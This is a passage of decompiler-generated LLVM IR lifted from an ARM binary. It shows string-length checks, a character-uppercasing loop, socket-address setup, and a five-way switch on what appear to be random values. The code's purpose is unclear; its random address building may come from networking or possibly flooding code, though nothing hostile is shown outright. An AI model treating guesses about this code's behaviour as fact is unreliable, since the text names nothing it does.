  %v6_8230 = call i32 @function_9f84(i32 %v0_822c, i32* %v5_8230, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8234 = load i32, i32* @r5, align 4
  store i32 %v0_8234, i32* %r1.global-to-local, align 4
  store i32 %v6_8230, i32* %sb.global-to-local, align 4
  store i32 22, i32* %r2.global-to-local, align 4
  %v0_8240 = load i32, i32* @r4, align 4
  store i32 %v0_8240, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_15760.23 to i32), i32* %r3.global-to-local, align 4
  %v5_8248 = inttoptr i32 %v0_8234 to i32*
  %v6_8248 = call i32 @function_9f84(i32 %v0_8240, i32* %v5_8248, i32 22, i32 ptrtoint ([2 x i8]* @global_var_15760.23 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_824c = load i32, i32* @r5, align 4
  store i32 %v0_824c, i32* %r1.global-to-local, align 4
  store i32 %v6_8248, i32* @sl, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  %v0_8258 = load i32, i32* @r4, align 4
  store i32 %v0_8258, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8260 = inttoptr i32 %v0_824c to i32*
  %v5_8260 = call i32 @function_a4e8(i32 %v0_8258, i32* %v4_8260, i32 24, i32 1)
  %v0_8264 = load i32, i32* @r5, align 4
  store i32 %v0_8264, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8260, i32* @r6, align 4
  %v0_8274 = load i32, i32* @r4, align 4
  store i32 %v0_8274, i32* %r0.global-to-local, align 4
  %v4_8278 = inttoptr i32 %v0_8264 to i32*
  %v5_8278 = call i32 @function_a4e8(i32 %v0_8274, i32* %v4_8278, i32 7, i32 80)
  %v2_8280 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8288 = mul i32 %v5_8278, 65536
  store i32 %v3_8288, i32* %r3.global-to-local, align 4
  %tmp199 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8280, i32* %r0.global-to-local, align 4
  store i32 10241, i32* @r2, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_829c = urem i32 %v5_8278, 65536
  store i32 %v3_829c, i32* %r8.global-to-local, align 4
  %v3_82a0 = call i32 @function_134d0(i8* %tmp199, i32 0)
  store i32 %v3_82a0, i32* %r0.global-to-local, align 4
  %v0_82a4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_82a4 = icmp slt i32 %v0_82a4, 0
  store i1 %v1_82a4, i1* %cpsr_n.global-to-local, align 1
  %v2_82a4 = icmp eq i32 %v0_82a4, 0
  store i1 %v2_82a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_82a4, label %.thread13, label %bb

bb:                                               ; preds = %dec_label_pc_81cc
  %v1_82a8 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_82a8 = icmp slt i32 %v1_82a8, 0
  store i1 %v2_82a8, i1* %cpsr_n.global-to-local, align 1
  %v3_82a8 = icmp eq i32 %v1_82a8, 0
  store i1 %v3_82a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_82a8, label %bb200, label %dec_label_pc_82c4

.thread13:                                        ; preds = %dec_label_pc_81cc
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b8

bb200:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_82b8

dec_label_pc_82b8:                                ; preds = %bb200, %dec_label_pc_82e4, %.thread13, %dec_label_pc_82d4, %dec_label_pc_82c4
  %v29_82c0 = phi i32 [ %v2_82e8, %dec_label_pc_82e4 ], [ %v3_82a0, %.thread13 ], [ %v3_82a0, %bb200 ], [ %v2_82d8, %dec_label_pc_82d4 ], [ %v2_82c8, %dec_label_pc_82c4 ]
  %v2_82c0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_82c0, i32* %r4.global-to-local, align 4
  store i32 %v6_81cc, i32* %r5.global-to-local, align 4
  store i32 %v9_81cc, i32* %r6.global-to-local, align 4
  store i32 %v15_81cc, i32* %r8.global-to-local, align 4
  ret i32 %v29_82c0

dec_label_pc_82c4:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_82a4, i32* %r0.global-to-local, align 4
  %v1_82c8 = inttoptr i32 %v0_82a4 to i8*
  %v2_82c8 = call i32 @function_124dc(i8* %v1_82c8)
  store i32 %v2_82c8, i32* %r0.global-to-local, align 4
  %v1_82cc = add i32 %v2_82c8, -255
  %v2_82cc = icmp ugt i32 %v2_82c8, 254
  store i1 %v2_82cc, i1* %cpsr_c.global-to-local, align 1
  %v3_82cc = sub i32 254, %v2_82c8
  %v4_82cc = and i32 %v3_82cc, %v2_82c8
  %v5_82cc = icmp slt i32 %v4_82cc, 0
  store i1 %v5_82cc, i1* %cpsr_v.global-to-local, align 1
  %v6_82cc = icmp slt i32 %v1_82cc, 0
  store i1 %v6_82cc, i1* %cpsr_n.global-to-local, align 1
  %v7_82cc = icmp eq i32 %v2_82c8, 255
  store i1 %v7_82cc, i1* %cpsr_z.global-to-local, align 1
  %v8_82d0 = icmp sgt i32 %v2_82c8, 255
  br i1 %v8_82d0, label %dec_label_pc_82b8, label %dec_label_pc_82d4

dec_label_pc_82d4:                                ; preds = %dec_label_pc_82c4
  %v0_82d4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_82d4, i32* %r0.global-to-local, align 4
  %v1_82d8 = inttoptr i32 %v0_82d4 to i8*
  %v2_82d8 = call i32 @function_124dc(i8* %v1_82d8)
  store i32 %v2_82d8, i32* %r0.global-to-local, align 4
  %v1_82dc = add i32 %v2_82d8, -127
  %v2_82dc = icmp ugt i32 %v2_82d8, 126
  store i1 %v2_82dc, i1* %cpsr_c.global-to-local, align 1
  %v3_82dc = sub i32 126, %v2_82d8
  %v4_82dc = and i32 %v3_82dc, %v2_82d8
  %v5_82dc = icmp slt i32 %v4_82dc, 0
  store i1 %v5_82dc, i1* %cpsr_v.global-to-local, align 1
  %v6_82dc = icmp slt i32 %v1_82dc, 0
  store i1 %v6_82dc, i1* %cpsr_n.global-to-local, align 1
  %v7_82dc = icmp eq i32 %v2_82d8, 127
  store i1 %v7_82dc, i1* %cpsr_z.global-to-local, align 1
  %v8_82e0 = icmp sgt i32 %v2_82d8, 127
  br i1 %v8_82e0, label %dec_label_pc_82b8, label %dec_label_pc_82e4

dec_label_pc_82e4:                                ; preds = %dec_label_pc_82d4
  %v0_82e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_82e4, i32* %r0.global-to-local, align 4
  %v1_82e8 = inttoptr i32 %v0_82e4 to i8*
  %v2_82e8 = call i32 @function_124dc(i8* %v1_82e8)
  store i32 %v2_82e8, i32* %r0.global-to-local, align 4
  %v1_82ec = add i32 %v2_82e8, -9
  %v2_82ec = icmp ugt i32 %v2_82e8, 8
  store i1 %v2_82ec, i1* %cpsr_c.global-to-local, align 1
  %v3_82ec = sub i32 8, %v2_82e8
  %v4_82ec = and i32 %v3_82ec, %v2_82e8
  %v5_82ec = icmp slt i32 %v4_82ec, 0
  store i1 %v5_82ec, i1* %cpsr_v.global-to-local, align 1
  %v6_82ec = icmp slt i32 %v1_82ec, 0
  store i1 %v6_82ec, i1* %cpsr_n.global-to-local, align 1
  %v7_82ec = icmp eq i32 %v2_82e8, 9
  store i1 %v7_82ec, i1* %cpsr_z.global-to-local, align 1
  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b8, label %bb201

bb201:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 364
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb201, %bb205
  %v0_82fc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @function_124dc(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v2_830c = sub i32 %v2_8300, %v3_8308
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v4_830c = xor i32 %v3_8308, %v2_8300
  %v5_830c = xor i32 %v2_830c, %v2_8300
  %v6_830c = and i32 %v5_830c, %v4_830c
  %v7_830c = icmp slt i32 %v6_830c, 0
  store i1 %v7_830c, i1* %cpsr_v.global-to-local, align 1
  %v8_830c = icmp slt i32 %v2_830c, 0
  store i1 %v8_830c, i1* %cpsr_n.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* %fp.global-to-local, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v3_8320 = sub nsw i32 121, %v6_8314
  %v4_8320 = and i32 %v3_8320, %v1_831c
  %v5_8320 = icmp slt i32 %v4_8320, 0
  store i1 %v5_8320, i1* %cpsr_v.global-to-local, align 1
  %v6_8320 = icmp ult i8 %v4_8314, 122
  store i1 %v6_8320, i1* %cpsr_n.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb202, label %bb203

bb202:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_8314, %bb202
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb202 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb202 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb204, label %._crit_edge

._crit_edge:                                      ; preds = %bb203
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb205

bb204:                                            ; preds = %bb203
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb205

bb205:                                            ; preds = %._crit_edge, %bb204
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb204 ]
  store i32 %v10_82f0, i32* %lr.global-to-local, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-40, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_11c08(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_11c08(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @function_11c08(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @function_11c08(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @function_11c08(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @function_11c08(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @function_11c08(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @function_11c08(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @function_11c08(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @function_11c08(i32 45)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v2_8390 = add i32 %v0_8390, -256
  %v3_8390 = icmp ugt i32 %v0_8390, 255
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v4_8390 = sub i32 255, %v0_8390
  %v5_8390 = and i32 %v4_8390, %v0_8390
  %v6_8390 = icmp slt i32 %v5_8390, 0
  store i1 %v6_8390, i1* %cpsr_v.global-to-local, align 1
  %v7_8390 = icmp slt i32 %v2_8390, 0
  store i1 %v7_8390, i1* %cpsr_n.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 256
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 256
  br i1 %v5_8394, label %thread-pre-split, label %bb206

bb206:                                            ; preds = %dec_label_pc_8340
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb206
  %v0_839c = phi i32 [ 256, %bb206 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @function_11c08(i32 46)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @function_13a94(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_83b8 = icmp slt i32 %v0_839c, 0
  store i1 %v1_83b8, i1* %cpsr_n.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_83b0, i32* @r5, align 4
  %tmp207 = icmp slt i32 %v0_839c, 1
  br i1 %tmp207, label %dec_label_pc_84f4, label %dec_label_pc_83c8

dec_label_pc_83c8:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9e70, %dec_label_pc_83c8
  %v1_83d8 = phi i32 [ %v1_9e8c, %dec_label_pc_9e70 ], [ %v2_83b0, %dec_label_pc_83c8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_81e4, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* @r7, align 4
  store i32 %v0_83e0, i32* %r0.global-to-local, align 4
  %v2_83e4 = call i32 @function_12cc4(i32 %v0_83e0, i32 %v1_81e4)
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_83f0 = and i32 %v2_83e4, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  %v5_83f0 = mul i32 %v2_83e4, 24
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  %v2_83f4 = add i32 %v5_83f0, %arg2
  store i32 %v2_83f4, i32* @r6, align 4
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @lr, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @sl, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v0_840c = load i32, i32* @lr, align 4
  %v2_8410 = inttoptr i32 %v1_83fc to i8*
  %v3_8410 = call i32 @function_12504(i8* %v2_8410, i32 %v0_8404)
  store i32 %v3_8410, i32* %r0.global-to-local, align 4
  %v0_8414 = load i32, i32* @r5, align 4
  %v1_8414 = add i32 %v0_8414, 532
  %v2_8414 = inttoptr i32 %v1_8414 to i8*
  %v3_8414 = load i8, i8* %v2_8414, align 1
  %v4_8414 = zext i8 %v3_8414 to i32
  store i32 %v4_8414, i32* %r3.global-to-local, align 4
  %v2_8418 = icmp ugt i8 %v3_8414, 46
  store i1 %v2_8418, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8418 = icmp ult i8 %v3_8414, 47
  store i1 %v6_8418, i1* %cpsr_n.global-to-local, align 1
  %v7_8418 = icmp eq i8 %v3_8414, 47
  store i1 %v7_8418, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8418, label %dec_label_pc_8444, label %dec_label_pc_8420

dec_label_pc_8420:                                ; preds = %dec_label_pc_83cc
  store i32 %v0_840c, i32* %r0.global-to-local, align 4
  %v1_8424 = inttoptr i32 %v0_840c to i8*
  %v2_8424 = call i32 @function_124dc(i8* %v1_8424)
  store i32 %v2_8424, i32* @r2, align 4
  %v0_842c = load i32, i32* @r5, align 4
  %v1_8430 = add i32 %v0_842c, 533
  store i32 %v1_8430, i32* @r0, align 4
  store i32 %v0_840c, i32* @r1, align 4
  %v3_8438 = call i32 @function_134c0(i32 %v1_8430, i32 %v0_840c, i32 %v2_8424)
  store i32 %v3_8438, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_8440 = load i32, i32* @r5, align 4
  %v3_8440 = add i32 %v2_8440, 532
  %v4_8440 = inttoptr i32 %v3_8440 to i8*
  store i8 47, i8* %v4_8440, align 1
  %v0_8448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8444

dec_label_pc_8444:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_8420
  %v0_8448 = phi i32 [ %v0_8414, %dec_label_pc_83cc ], [ %v0_8448.pre, %dec_label_pc_8420 ]
  %v0_8444 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8444, i32* %r1.global-to-local, align 4
  %v1_8448 = add i32 %v0_8448, 1440
  store i32 %v1_8448, i32* @r0, align 4
  %v2_844c = inttoptr i32 %v1_8448 to i8*
  %v3_844c = call i32 @function_12504(i8* %v2_844c, i32 %v0_8444)
  %v0_8450 = load i32, i32* @r5, align 4
  %v0_8454 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8454, i32* %r1.global-to-local, align 4
  %v1_8458 = add i32 %v0_8450, 1431
  store i32 %v1_8458, i32* @r0, align 4
  %v2_845c = inttoptr i32 %v1_8458 to i8*
  %v3_845c = call i32 @function_12504(i8* %v2_845c, i32 %v0_8454)
  %v0_8460 = load i32, i32* @r5, align 4
  %v1_8464 = add i32 %v0_8460, 789
  store i32 %v1_8464, i32* @r0, align 4
  %v0_8468 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8468, i32* %r1.global-to-local, align 4
  %v2_846c = inttoptr i32 %v1_8464 to i8*
  %v3_846c = call i32 @function_12504(i8* %v2_846c, i32 %v0_8468)
  store i32 %v3_846c, i32* %r0.global-to-local, align 4
  %v0_8470 = load i32, i32* @r6, align 4
  %v1_8470 = add i32 %v0_8470, 20
  %v2_8470 = inttoptr i32 %v1_8470 to i8*
  %v3_8470 = load i8, i8* %v2_8470, align 1
  %v4_8470 = zext i8 %v3_8470 to i32
  store i32 %v4_8470, i32* %r3.global-to-local, align 4
  %v2_8474 = icmp ugt i8 %v3_8470, 30
  store i1 %v2_8474, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_8474 = icmp ult i8 %v3_8470, 31
  store i1 %v6_8474, i1* %cpsr_n.global-to-local, align 1
  %v7_8474 = icmp eq i8 %v3_8470, 31
  store i1 %v7_8474, i1* %cpsr_z.global-to-local, align 1
  %v2_8478 = xor i1 %v7_8474, true
  %v3_8478 = and i1 %v2_8474, %v2_8478
  br i1 %v3_8478, label %dec_label_pc_84c8, label %dec_label_pc_847c

dec_label_pc_847c:                                ; preds = %dec_label_pc_8444
  %v1_847c = add i32 %v0_8470, 16
  %v2_847c = inttoptr i32 %v1_847c to i32*
  %v3_847c = load i32, i32* %v2_847c, align 4
  store i32 %v3_847c, i32* @r4, align 4
  %v0_8480 = call i32 @function_fe24()
  store i32 %v0_8480, i32* %r0.global-to-local, align 4
  %v0_8484 = load i32, i32* @r4, align 4
  %v1_8488 = and i32 %v0_8484, 65280
  store i32 %v1_8488, i32* %r3.global-to-local, align 4
  %v1_8484 = udiv i32 %v0_8484, 256
  %v3_848c = and i32 %v1_8484, 65280
  store i32 %v3_848c, i32* %r2.global-to-local, align 4
  %v3_8490 = mul i32 %v0_8484, 16777216
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_8494 = mul nuw nsw i32 %v1_8488, 256
  %v5_8494 = or i32 %v4_8494, %v3_8490
  store i32 %v5_8494, i32* %r1.global-to-local, align 4
  %v0_8498 = load i32, i32* @r6, align 4
  %v1_8498 = add i32 %v0_8498, 20
  %v2_8498 = inttoptr i32 %v1_8498 to i8*
  %v3_8498 = load i8, i8* %v2_8498, align 1
  %v4_8498 = zext i8 %v3_8498 to i32
  store i32 %v4_8498, i32* %ip.global-to-local, align 4
  %v2_84a0 = call i32 @llvm.bswap.i32(i32 %v0_8484)
  %v7_84a4 = lshr i32 %v0_8480, %v4_8498
  %v8_84a4 = add i32 %v7_84a4, %v2_84a0
  store i32 %v8_84a4, i32* %r2.global-to-local, align 4
  %v3_84b0 = mul i32 %v8_84a4, 16777216
  %v1_84b4 = and i32 %v8_84a4, 65280
  store i32 %v1_84b4, i32* %r0.global-to-local, align 4
  %v4_84b8 = mul nuw nsw i32 %v1_84b4, 256
  %v5_84b8 = or i32 %v4_84b8, %v3_84b0
  store i32 %v5_84b8, i32* %r1.global-to-local, align 4
  %v2_84bc = and i32 %v8_84a4, 8388608
  %v3_84bc = icmp ne i32 %v2_84bc, 0
  store i1 %v3_84bc, i1* %cpsr_c.global-to-local, align 1
  %v2_84c0 = call i32 @llvm.bswap.i32(i32 %v8_84a4)
  store i32 %v2_84c0, i32* %r3.global-to-local, align 4
  %v1_84c4 = load i32, i32* @r5, align 4
  %v2_84c4 = add i32 %v1_84c4, 16
  %v3_84c4 = inttoptr i32 %v2_84c4 to i32*
  store i32 %v2_84c0, i32* %v3_84c4, align 4
  br label %dec_label_pc_84c8

dec_label_pc_84c8:                                ; preds = %dec_label_pc_8444, %dec_label_pc_847c
  %v0_84c8 = call i32 @function_fe24()
  store i32 %v0_84c8, i32* %r0.global-to-local, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_84d0 = call i32 @function_12bf8(i32 %v0_84c8, i32 5)
  store i32 %v2_84d0, i32* %r0.global-to-local, align 4
  %v1_84d4 = add i32 %v2_84d0, -4
  %v3_84d4 = sub i32 3, %v2_84d0
  %v4_84d4 = and i32 %v3_84d4, %v2_84d0
  %v5_84d4 = icmp slt i32 %v4_84d4, 0
  store i1 %v5_84d4, i1* %cpsr_v.global-to-local, align 1
  %v6_84d4 = icmp slt i32 %v1_84d4, 0
  store i1 %v6_84d4, i1* %cpsr_n.global-to-local, align 1
  %v7_84d4 = icmp eq i32 %v2_84d0, 4
  store i1 %v7_84d4, i1* %cpsr_z.global-to-local, align 1
  %v5_84d8 = and i32 %v2_84d0, 1073741824
  %v6_84d8 = icmp ne i32 %v5_84d8, 0
  store i1 %v6_84d8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84d0, label %dec_label_pc_9e70 [
    i32 0, label %dec_label_pc_9ed4
    i32 1, label %dec_label_pc_9f00
    i32 2, label %dec_label_pc_9f2c
    i32 3, label %dec_label_pc_9f58
    i32 4, label %dec_label_pc_9e48
  ]

dec_label_pc_84f4:                                ; preds = %thread-pre-split
  %v1_84f8 = add i32 %v2_83b0, 1456
  %v0_8500 = load i32, i32* %r8.global-to-local, align 4
  %v1_8500 = urem i32 %v0_8500, 256
  store i32 %v1_8500, i32* %r3.global-to-local, align 4
  %v1_8504 = add i32 %v2_83b0, 1464
  store i32 %v1_8504, i32* %r1.global-to-local, align 4
  %v2_8508 = ptrtoint i32* %stack_var_-10568 to i32
  store i32 %v2_8508, i32* %r2.global-to-local, align 4
  store i32 %v1_84f8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_8528.preheader

dec_label_pc_8528.preheader:                      ; preds = %dec_label_pc_84f4, %dec_label_pc_9e94
  %storemerge148.in.in = phi i32 [ %v0_9ea8, %dec_label_pc_9e94 ], [ %v0_8500, %dec_label_pc_84f4 ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_9ea0, %dec_label_pc_9e94 ], [ %v1_84f8, %dec_label_pc_84f4 ]
  %stack_var_-20860.0.ph = phi i32 [ %v1_9ea8, %dec_label_pc_9e94 ], [ %v1_8500, %dec_label_pc_84f4 ]
  %stack_var_-20872.0.ph = phi i32 [ %v1_9eac, %dec_label_pc_9e94 ], [ %v1_8504, %dec_label_pc_84f4 ]
  %stack_var_-20856.0.ph = phi i32 [ %v2_9eb0, %dec_label_pc_9e94 ], [ %v2_8508, %dec_label_pc_84f4 ]
  %storemerge148.in = and i32 %storemerge148.in.in, 128
  %storemerge148 = icmp ne i32 %storemerge148.in, 0
  store i1 %storemerge148, i1* %cpsr_c.global-to-local, align 1
  %v3_9eb8 = udiv i32 %storemerge148.in.in, 256
  store i32 %v3_9eb8, i32* %r8.global-to-local, align 4
  %v4_8590 = mul nuw nsw i32 %stack_var_-20860.0.ph, 256
  %v2_86d0 = ptrtoint i32* %stack_var_-148 to i32
  %v2_86e8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_8728 = ptrtoint i32* %stack_var_-72 to i32
  %v3_8734 = bitcast i32* %stack_var_-72 to %sockaddr*
  %v2_8748 = ptrtoint i32* %stack_var_-36 to i32
  %v1_8940 = inttoptr i32 %stack_var_-20856.0.ph to i8*
  %v1_8c94 = icmp slt i32 %v6_8200, 0
  %v2_8c94 = icmp eq i32 %v6_8200, 0
  %v4_8ce8 = inttoptr i32 %stack_var_-20856.0.ph to i32*
  %v1_8b90 = inttoptr i32 %v6_8200 to i8*
  %v2_87b4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_87b8 = ptrtoint i32* %stack_var_-200 to i32
  %v2_87bc = ptrtoint i32* %stack_var_-328 to i32
  %v2_921c = add i32 %v2_8748, -20773
  %v2_88a8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_88b4 = ptrtoint i32* %stack_var_-48 to i32
  %v5_8590 = or i32 %v4_8590, %v3_9eb8
  %v1_8594 = and i32 %v3_9eb8, 128
  %v2_8594 = icmp ne i32 %v1_8594, 0
  %v3_8594248 = udiv i32 %v5_8590, 256
  %v1_859c = add i32 %stack_var_-20872.0.ph, -1464
  %v1_85a4 = add i32 %stack_var_-20872.0.ph, -33
  %sext = mul i32 %v3_8594248, 16777216
  %v4_8710 = sdiv i32 %sext, 16777216
  %sext10 = mul i32 %v3_9eb8, 16777216
  %v4_8718 = sdiv i32 %sext10, 16777216
  %v2_85dc = add i32 %v2_86d0, 112
  br label %dec_label_pc_8528

dec_label_pc_8528:                                ; preds = %dec_label_pc_8794, %dec_label_pc_878c, %dec_label_pc_8574, %dec_label_pc_8838, %dec_label_pc_8528.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_852c = call i32 @function_1316c(i32* null)
  store i32 %v2_852c, i32* %r0.global-to-local, align 4
  store i32 %v2_852c, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 20684, i32* %ip.global-to-local, align 4
